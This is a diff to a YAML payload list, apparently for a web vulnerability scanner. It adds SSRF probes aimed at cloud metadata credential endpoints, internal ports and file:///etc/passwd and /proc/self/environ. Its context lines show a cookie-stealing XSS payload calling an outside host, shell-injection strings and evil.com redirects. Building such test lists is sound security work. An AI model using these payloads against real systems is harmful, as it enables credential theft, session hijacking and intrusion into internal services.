@@ -172,7 +172,7 @@ xss:
   - "<script src=//x.com/x.js></script>"
   - "<img src=x onerror=\"this.src='//x.com/'+document.cookie\">"
 
-os_injection:
+os:
   # ── Unix / Linux basic ────────────────────────────────────────────
   - "; ls -la"
   - "| ls -la"
@@ -382,6 +382,26 @@ open_redirect:
   - "%5C%5Cevil.com"
   - "\tevil.com"
   - "\nevil.com"
+
+ssrf:
+  # ── Cloud metadata endpoints ──────────────────────────────────────────
+  - "http://169.254.169.254/latest/meta-data/"
+  - "http://169.254.169.254/latest/meta-data/iam/security-credentials/"
+  - "http://metadata.google.internal/computeMetadata/v1/"
+  - "http://169.254.169.254/metadata/instance"
+  # ── Internal services ─────────────────────────────────────────────────
+  - "http://localhost/"
+  - "http://127.0.0.1/"
+  - "http://[::1]/"
+  - "http://0.0.0.0/"
+  # ── File read via file:// ─────────────────────────────────────────────
+  - "file:///etc/passwd"
+  - "file:///etc/hosts"
+  - "file:///proc/self/environ"
+  # ── Internal port scan probes ─────────────────────────────────────────
+  - "http://127.0.0.1:22/"
+  - "http://127.0.0.1:3306/"
+  - "http://127.0.0.1:6379/"
 
 # LLM prompt templates for context-aware payload generation
 llm_prompts:
